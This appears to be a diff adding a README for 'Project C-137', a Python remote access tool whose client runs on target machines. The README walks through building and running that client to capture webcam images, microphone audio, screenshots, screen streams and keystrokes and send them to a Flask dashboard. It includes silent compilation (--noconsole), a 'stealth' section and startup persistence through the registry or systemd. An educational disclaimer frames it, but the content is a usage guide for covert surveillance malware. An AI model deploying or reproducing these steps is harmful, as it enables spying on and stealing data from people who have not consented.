@@ -1,0 +1,185 @@
+Project C-137: Remote Access Tool (RAT)
+Project C-137 is a Remote Access Tool designed for monitoring and controlling remote systems. It consists of a Flask-based server (rat_server.py) and a Python client (rat_client.py). The server provides a web interface for managing connected clients, issuing commands, and exfiltrating data such as system info, webcam captures, screenshots, screen streams, microphone recordings, and keylogs.
+Note: This tool is intended for educational purposes and authorized testing only. Unauthorized use on systems without explicit permission is illegal and unethical.
+Features
+
+Client Management: View and manage connected clients with details like IP, location, and system status.
+Command Execution: Send commands to clients (e.g., whoami, screenshot, webcam).
+Data Exfiltration:
+System and network usage graphs.
+Webcam captures, screenshots, and screen streaming.
+Microphone recordings.
+Keylogging.
+
+
+File Upload/Download: Upload files to clients or download files from them.
+Authentication: Secure login page to prevent unauthorized access.
+Cross-Platform: Client can be compiled for both Windows and Linux.
+
+Project Structure
+project-c137/
+│
+├── rat_server.py         # Flask server for managing clients and serving the web interface
+├── rat_client.py         # Client script to be run on target systems
+├── templates/
+│   ├── index.html        # Main dashboard template
+│   └── login.html        # Login page template
+├── uploads/              # Directory for storing uploaded files and exfiltrated data
+├── downloads/            # Directory for storing files downloaded from clients
+├── .env                  # Environment variables for server configuration
+└── README.md             # Project documentation
+
+Prerequisites
+
+Python 3.8 or higher
+A web browser for accessing the dashboard
+System dependencies (for client):
+Windows: Ensure webcam, microphone, and screen capture permissions are enabled.
+Linux: Install libopencv-dev, portaudio19-dev, and alsa-utils for media capture.
+
+
+
+Installation
+1. Clone the Repository
+git clone https://github.com/yourusername/project-c137.git
+cd project-c137
+
+2. Set Up a Virtual Environment
+python -m venv venv
+source venv/bin/activate  # On Windows: venv\Scripts\activate
+
+3. Install Dependencies
+pip install -r requirements.txt
+
+Note: Create a requirements.txt file with the following dependencies:
+Flask==2.3.3
+Flask-SocketIO==5.3.6
+python-dotenv==1.0.1
+socketio-client==0.5.7.2
+psutil==6.0.0
+pyautogui==0.9.54
+opencv-python==4.10.0.84
+pyaudio==0.2.14
+Pillow==10.4.0
+pynput==1.7.7
+
+4. Configure Environment Variables
+Create a .env file in the project root with the following:
+AUTH_USERNAME=your_username
+AUTH_PASSWORD=your_password
+SECRET_KEY=your_secret_key
+
+
+Replace your_username and your_password with secure credentials.
+Generate a secure SECRET_KEY (e.g., using python -c "import os; print(os.urandom(24).hex())").
+
+5. Run the Server
+python rat_server.py
+
+
+Access the dashboard at http://localhost:5000.
+Log in using the credentials from .env.
+
+Client Setup
+1. Compile the Client
+The client script (rat_client.py) can be compiled into standalone executables for Windows and Linux using PyInstaller.
+On Windows
+pyinstaller --onefile --noconsole --name rat_client rat_client.py
+
+
+Output: dist/rat_client.exe
+The --noconsole flag ensures the client runs silently without a command prompt window.
+
+On Linux
+pyinstaller --onefile --name rat_client rat_client.py
+chmod +x dist/rat_client
+
+
+Output: dist/rat_client
+
+2. Run the Client
+
+Copy the compiled client to the target system.
+Run the executable:
+Windows: Double-click rat_client.exe or run via command line.
+Linux: ./rat_client
+
+
+The client will connect to the server and appear in the dashboard.
+
+3. Ensure Stealth (Optional)
+
+The client logs to rat_client.log instead of the console for stealth.
+Persistence:
+Windows: The client sets itself to run on startup via the Windows Registry.
+Linux: Use a systemd service (see rat_client.py comments for setup).
+
+
+
+Usage
+
+Access the Dashboard:
+
+Open http://localhost:5000 in your browser.
+Log in with your credentials.
+
+
+Manage Clients:
+
+View connected clients in the dashboard.
+Select a client to monitor system/network usage, capture media, or send commands.
+
+
+Send Commands:
+
+Use the command input to send commands like webcam, screenshot, mic, or custom shell commands.
+Quick actions (e.g., keylog, start_stream) are available as buttons.
+
+
+Exfiltrate Data:
+
+View system info, network usage, webcam captures, screenshots, screen streams, and keylogs in the dashboard.
+Microphone recordings are playable in the browser.
+
+
+File Operations:
+
+Upload files to clients via the upload button.
+Download files from clients using the download <filename> command.
+
+
+
+Security Considerations
+
+HTTPS: In production, deploy the server with HTTPS to encrypt traffic.
+Strong Credentials: Use strong, unique values for AUTH_USERNAME and AUTH_PASSWORD.
+Firewall: Restrict server access to trusted IPs.
+Client Stealth: The client runs silently and logs to a file, but ensure legal and ethical use.
+Data Storage: Exfiltrated data is stored in uploads/. Secure this directory and delete sensitive data after use.
+
+Troubleshooting
+
+Client Not Connecting:
+Ensure the server is running and accessible (check firewall and port 5000).
+Verify the client’s network connectivity to the server.
+
+
+Media Capture Issues:
+Windows: Check permissions for webcam/microphone.
+Linux: Install required libraries (libopencv-dev, portaudio19-dev) and ensure ALSA is configured.
+
+
+Authentication Errors:
+Verify .env credentials are correct.
+Clear browser cookies if session issues occur.
+
+
+
+Contributing
+Contributions are welcome! Please submit pull requests or open issues on the GitHub repository.
+License
+This project is licensed under the MIT License. See the LICENSE file for details.
+Disclaimer
+This tool is for educational and authorized testing purposes only. The developers are not responsible for any misuse or damage caused by this software.
+
+Last Updated: June 06, 2025
